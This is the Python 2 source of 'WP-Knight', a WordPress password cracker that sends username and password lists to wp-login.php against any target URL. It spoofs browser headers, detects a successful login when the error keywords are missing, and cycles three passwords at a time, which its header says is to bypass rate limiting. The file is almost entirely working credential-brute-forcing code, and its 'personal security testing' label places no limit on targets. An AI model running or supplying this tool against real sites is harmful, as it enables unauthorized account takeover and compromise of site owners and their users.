
# WordPress Cracker 6/19/2018
# Coded by Pythogen

# Intended for personal security testing
# WP-Knight was created as an alternative to WPScan which has too many cycle limitations.
# WP-Knight has unique cycling features to help bypass rate limit and adapt to a target's unique security settings.

# (6/19/2018) - Basic cracker function complete. Works perfectly on any WordPress target with a unique cycle algorithm. New features will be added soon.

import sys
import requests
import time
import tqdm
from itertools import islice

print """

	 _  _  _ ______       _     _       _       _          
	(_)(_)(_|_____ \     (_)   | |     (_)     | |     _   
	 _  _  _ _____) )____ _____| |____  _  ____| |__ _| |_ 
	| || || |  ____(_____)  _   _)  _ \| |/ _  |  _ (_   _)
	| || || | |          | |  \ \| | | | ( (_| | | | || |_ 
	 \_____/|_|          |_|   \_)_| |_|_|\___ |_| |_| \__)
	                                     (_____|           
	 Coded by Pythogen (WordPress 4.9.6+)

"""

# Default login URL (Use 'url' command to set your target)
login_URL = "http://127.0.0.1/wp/wordpress/wp-login.php"
# Detecting incorrect password
keyword = "incorrect"
# Detecting invalid username
keyword2 = "Invalid"

uname = 'a'
pwd = 'a'
inc = 0
aPlace = 0
bPlace = 3

def console():
	while(True):
		cmd = raw_input(" Enter command> ")
		if cmd == "help":
			print """\n Commands:
	go - Activate WP-Knight
	url - Set login URL ([website]/wp/wordpress/wp-login.php)
	exit - Exit WP-Knight
			"""
		elif cmd == "exit":
			sys.exit()
		elif cmd == "go":
			print ""
			print "\n WP-Knight Activated! \n"
			bruteforce()
		elif cmd == "url":
			url_config()
		else:
			print "\n Invalid Command\n"

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def url_config():
	global login_URL
	login_URL = raw_input("\n Enter target URL: ")
	print ""

def bruteforce():
	global aPlace
	global bPlace
	global keyword

	text_file = open("list.txt", "r")
	text_file2 = open("pw.txt", "r")

	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_file2.read().split('\n')

		# Username cycle
		for u in USERNAME:
			# Password cycle (Only first three words)
			for p in PASSWORD[aPlace:bPlace]:

				# Print process
				uname = u
				pwd = p
				print ' %s:%s' % (u,p)

				# 1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				#POST Login data
				login_data = \
				{
					'log': uname,
					'pwd': pwd,
					'wp-submit': 'Log In',
					'redirect_to': redirect,
					'testcookie': '1'
				}

				#Header data
				header_data = \
				{
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept-Language': 'en-US,en;q=0.9',
					'Cache-Control': 'max-age=0',
					'Connection': 'keep-alive',
					'Content-Length': '116',
					'Content-Type': 'application/x-www-form-urlencoded',
					'Cookie': 'wordpress_test_cookie=WP+Cookie+check',
					'Host': host,
					'Upgrade-Insecure-Requests': '1',
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'
				}

				# 2) Submit POST data. Initialize login
				bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)

				# Debug purposes
				#print bruteforce.page.content

				# 4) Looking for keyword indicating successful login
				Check = bruteforce.page.content.find(keyword)
				Check2 = bruteforce.page.content.find(keyword2)

				# Check = incorrect , Check2 = invalid
				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
				if Check == -1 and Check2 == -1:
					print "\n Cracked: %s:%s \n" % (u,p)
					return
				# Otherwise, continue..
				else:
					pass

		text_file.close()
		text_file2.close()
		aPlace = aPlace + 3
		bPlace = bPlace + 3
		try:
			bruteforce()
		except:
			print ""

# Set request header details:
host = find_between(login_URL,"//","/")
redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)

console()